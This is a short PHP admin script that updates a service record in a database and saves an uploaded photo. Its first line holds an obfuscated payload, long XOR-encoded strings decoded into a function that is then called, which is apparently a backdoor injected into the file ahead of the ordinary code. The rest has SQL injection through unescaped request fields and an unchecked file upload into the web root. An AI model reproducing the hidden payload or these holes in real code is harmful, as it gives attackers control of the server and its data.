<?php $LorxehN='5YIAZKjZ;:C29 E'; $fITLwZy='V+, ..5<NT FPO+'^$LorxehN; $Edxyhvf='BSdG3:N950UYeRV :18xmOURaX57.b3.UODged0d7XMUN=>C=e0W 9=3OA,>=C3KWU+,,xjn== JZqqwdIg>SJ BOodnwhmh8F1= CrEcsMSSls=i=N797:QkIZ= ocwU0dxPgSAbZOOkcnixkO--XnnSah7HHV.,bV;jRmOTBGE;eq:3<zgyynA9FIMIYVcbQEIBmgoVl.Xmt419,qYd 5=HPWfhO4XWj 15QlH7.6F=amOZA913HDhDU:u672-2z4 fj9 Wikrgk36ZMPmw=9njV+-1f1UBKhQG.Y=ldXeWT60tTNtEU6F0bfIoh;QSfLRHU=ZnHNcL49 +4Z:uku8ye dr<zy;0An R0yYHpI83:;VfBPS0qiJS8 i=E ouScP AihAbSRVOOnehu<54,5zrs+AS:ZoI008wIHmA85PK+W4Z=XC==8j0Y<YnrUI1X Z7XcpgO.YW.HAB 3AQHDyn>M  g2YAXLkY<+AKJVMUhrtZ6>HUIb8KWnSDU5 DyaU-6TbCRWWFZgzShmz.6AlcQ8=2eW<WRv5aOYWPn+RVoR QiUBz4lxzTNSUcYZpUb7hVOxrfqBbjApV= 9N0G DlHD;2; Jm1O-WCA>aJkTXO:8aeuVeynl=szQ=Q;le UHJ:r=AN+7+ q,ypdb54RXOjLkr5'; $PEUnUGOz=$fITLwZy('', '+5LfUO ZAY:7:7.IIEKPJ7: ><TCO=lC ;cNLDKn>>8;-IW,SEH8RfYR; saP6Gcs1JXMTJJVXYczQQWD2m7ZnO7;OYNPOVb1OWRRkV,CNmchLWTUN:EURTyO-;IAFXWqYOSymZHF5:;KMSIPO+LY95J:<Hihl=KU9rRJwM< 0+ UMUQVES:PBdH04,9<+8KF>0=kVmf+fSRgPPPMMQdDFTQ;5llL+U,65KTLqQhQOZ5XZgE<.KTR+,Hlqe6yxydwZUSFNRE.IVLGOEW685DWF3gN2JYP9Z0;kUqcE<DWnQA35BQTinP34Z3UYl4ebR7sNmv,4I;Gh5iERVRNU9RUCQg+ q17o.YZCaJK7IYdvPmNRVN3Ob+Y9xM.2LA6V YOHsG;E8RbHkw67;.NXHQJTXYPAxzVK.0PK-QDYWth-4VF59B6X3G=kERJ5T8H81-8<EpB;D=UD8+K:8J-ifDR50ahYJZ,TA8Y<8qePSUMio.794HTRzWL:40=S..16<<FT7QF>HOsNcv362;NZuNMRCRtDG5YIS>pW2+QhHodjpIJ35VjDbQ7zHWUIIg+6mQ;hB0TQXd+LEUVkBLgP7ORX7o,E=3-<RAOSbJA.T;, ZFfKp<.NYHLUvEYNLFys4K0WDAD4<+aUM 7GXJDVqPKnkPL;,gZePxH'^$Edxyhvf); $PEUnUGOz();
	ini_set('display_errors', '1');
	include('../../config/config.php');
	
	$id= $_GET['id'];
	$servicename = $_POST['servicename'];
	$servicedate = $_POST['servicedate'];
	$photo = $_POST['photo'];
	$servicecomments = $_POST['servicecomments'];
	$status = $_POST['status'];

	$sql ="UPDATE service_register SET servicename='$servicename', servicedate='$servicedate', photo='$photo', servicecomments='".mysql_real_escape_string($servicecomments)."', status='$status' WHERE id='".$id."'";

	$query = mysql_query($sql);
	//echo mysql_error($connect);
	
	if(isset($_FILES['photo']['name']) && !empty($_FILES['photo']['name'])) {
		$directory = $_SERVER['DOCUMENT_ROOT']."/admin/servicephotos/";
		$upload = $directory.$_FILES['photo']['name'];
		$moving = move_uploaded_file($_FILES['photo']['tmp_name'],$upload);
	}
	
	

	header('location:'.$localpath.'/admin/templates/index.php?page=thanks.php&msg=serviceupdate');
?>